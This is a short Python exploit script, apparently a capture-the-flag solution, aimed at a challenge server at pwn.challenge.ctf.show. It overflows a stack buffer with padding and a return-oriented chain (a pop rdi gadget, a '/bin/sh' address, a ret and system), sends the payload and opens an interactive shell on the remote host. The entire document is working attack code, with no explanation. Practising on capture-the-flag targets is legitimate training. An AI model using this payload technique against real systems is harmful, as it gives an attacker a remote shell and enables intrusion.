from pwn64 import *
u=remote("pwn.challenge.ctf.show",28237)
pop_rdi=0x0000000000400843
sh=0x0400872
ret=0x000000000040053e
system=0x0400560
payload=b'a'*(0xA+8)+p64(pop_rdi)+p64(sh)+p64(ret)+p64(system)
u.sendline(payload)
u.interactive()